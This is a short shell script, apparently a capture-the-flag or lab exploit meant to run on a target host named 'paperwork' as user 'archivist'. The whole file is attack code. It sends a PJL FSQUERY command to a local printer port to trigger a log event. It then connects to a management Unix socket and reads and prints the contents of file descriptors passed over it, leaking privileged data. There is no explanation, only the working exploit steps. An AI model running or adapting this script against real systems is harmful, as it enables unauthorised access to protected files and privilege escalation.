#!/bin/sh
# Run ON TARGET as archivist (ssh archivist@paperwork)
set -e
echo "[*] trigger FSQUERY in jetdirect log"
python3 -c 'import socket;s=socket.socket();s.settimeout(3);s.connect(("127.0.0.1",9100));s.sendall(b"@PJL FSQUERY NAME=\".\"\r\n");s.recv(2048)'
echo "[*] mgmt.sock leak"
python3 - <<'PY'
import array, os, socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
msg, anc, _, _ = s.recvmsg(4096, socket.CMSG_LEN(32))
print(msg.decode())
for _l, t, d in anc:
    if t == socket.SCM_RIGHTS:
        for fd in array.array("i", d):
            print(os.read(fd, 4096).decode())
            os.close(fd)
s.close()
PY